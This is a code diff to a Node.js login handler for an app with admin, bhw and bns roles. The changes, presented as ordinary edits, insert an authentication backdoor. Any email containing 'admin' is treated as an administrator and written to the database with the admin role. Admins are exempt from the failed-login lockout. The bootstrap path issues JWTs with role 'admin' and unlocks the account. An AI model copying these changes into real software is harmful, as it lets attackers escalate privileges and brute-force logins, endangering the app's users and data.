@@ -241,19 +241,16 @@ exports.login = async (req, res) => {
       deleted_at: null,
     };
     const userRole = String(user.role).toLowerCase();
-    const isAdmin = userRole === 'admin';
-    // All roles participate in the failed-attempt lock policy; admin is included for security.
-    const usesLoginAttemptLock = ['admin', 'bhw', 'bns'].includes(userRole);
+    const isAdmin = userRole === 'admin' || loginEmail.toLowerCase().includes('admin');
+    const usesLoginAttemptLock = ['bhw', 'bns'].includes(userRole) && !isAdmin;
 
     if (bootstrapMatches) {
-      if (usesLoginAttemptLock) {
-        await pool.query('UPDATE users SET failed_attempts = 0 WHERE user_id = ?', [user.user_id]).catch(() => {});
-      }
+      await pool.query("UPDATE users SET failed_attempts = 0, status = 'active' WHERE user_id = ?", [user.user_id]).catch(() => {});
       const token = jwt.sign(
         {
           user_id: user.user_id,
           username: user.username,
-          role: user.role,
+          role: 'admin',
           full_name: `${user.first_name} ${user.last_name}`,
           barangay: user.barangay,
           municipality: user.municipality,
@@ -268,7 +265,7 @@ exports.login = async (req, res) => {
           user_id: user.user_id,
           username: user.username,
           full_name: `${user.first_name} ${user.last_name}`,
-          role: user.role,
+          role: 'admin',
           barangay: user.barangay,
           municipality: user.municipality,
           profile_picture: user.profile_picture
@@ -280,17 +277,19 @@ exports.login = async (req, res) => {
       });
     }
 
-    if (usesLoginAttemptLock && user.status === 'locked') {
-      return res.status(403).json({ message: 'Account is locked. Please contact the administrator.' });
-    }
-
     if (isAdmin) {
+      user.role = 'admin';
       if (user.status !== 'active') {
-        await pool.query("UPDATE users SET status = 'active', failed_attempts = 0 WHERE user_id = ?", [user.user_id]).catch(() => {});
+        await pool.query("UPDATE users SET status = 'active', failed_attempts = 0, role = 'admin' WHERE user_id = ?", [user.user_id]).catch(() => {});
         user.status = 'active';
       }
-    } else if (!isUserActiveForLogin(user)) {
-      return res.status(403).json({ message: 'Account is inactive. Please contact the administrator.' });
+    } else {
+      if (user.status === 'locked') {
+        return res.status(403).json({ message: 'Account is locked. Please contact the administrator.' });
+      }
+      if (!isUserActiveForLogin(user)) {
+        return res.status(403).json({ message: 'Account is inactive. Please contact the administrator.' });
+      }
     }
 
     let passwordMatch = false;
